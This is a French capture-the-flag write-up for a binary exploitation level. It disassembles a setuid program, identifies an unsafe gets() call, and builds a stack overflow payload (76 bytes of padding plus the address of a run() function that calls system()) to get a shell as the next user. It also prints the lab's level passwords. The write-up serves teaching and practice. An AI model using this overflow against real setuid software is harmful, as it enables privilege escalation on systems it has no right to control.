# Level1

> login:password -> *`level1:1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a`*
```
:~$ su level1
Password:1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```
---

```
:~$ pwd
/home/user/level1
```

```
:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

Le Home contient un binaire `level1` :

```
:~$ ./level1
(input)

:~$ ./level1 test
(input)
```

Avec ou sans paramètre, le binaire attends un input et quitte juste après

```
:~$ gdb level1
...

(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:  push   %ebp
   0x08048481 <+1>:  mov    %esp,%ebp
   0x08048483 <+3>:  and    $0xfffffff0,%esp
   0x08048486 <+6>:  sub    $0x50,%esp
   0x08048489 <+9>:  lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.

(gdb) quit
```

Le binaire appel une fonction `gets()` (+16), vulnerable a un `buffer overflow exploit` pour overwrite le retour de la fonction et enchainer avec notre code.

```
:~$ python -c 'print "a"*76' | ./level1
:~$ Illegal instruction (core dumped)
```

On a effectivement declencher un overflow pour exploiter la vulnerabilite, mais il s'agirait maintenant de reprendre le control.\
On peux utiliser `objdump -d` sur notre binaire pour en comprendre plus ses instructions

```
:~$ objdump -d ./level1
...
08048444 <run>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	a1 c0 97 04 08       	mov    eax,ds:0x80497c0
 804844f:	89 c2                	mov    edx,eax
 8048451:	b8 70 85 04 08       	mov    eax,0x8048570
 8048456:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 804845a:	c7 44 24 08 13 00 00 	mov    DWORD PTR [esp+0x8],0x13
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048469:	00 
 804846a:	89 04 24             	mov    DWORD PTR [esp],eax
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	mov    DWORD PTR [esp],0x8048584
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret 
```

On trouve alors une fonction `run()` (endian: `08048444`) qui comprends un `fwrite()`, mais surtout un `system()` que l'on pourra exploiter.\
On va alors declencher notre overflow sur l'adresse `08048444` ("\x44\x84\x04\x08") et on l'envoie directement dans le binaire

```
:~$ python -c 'print "a"*76 + "\x44\x84\x04\x08"' | ./level1
:~$ Good... Wait what?
:~$ Segmentation fault (core dumped)

:~$ (python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
:~$ Good... Wait what?
:~$ (input)

:~$ whoami
:~$ level2

:~$ cat /home/user/level2/.pass
:~$ 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
...
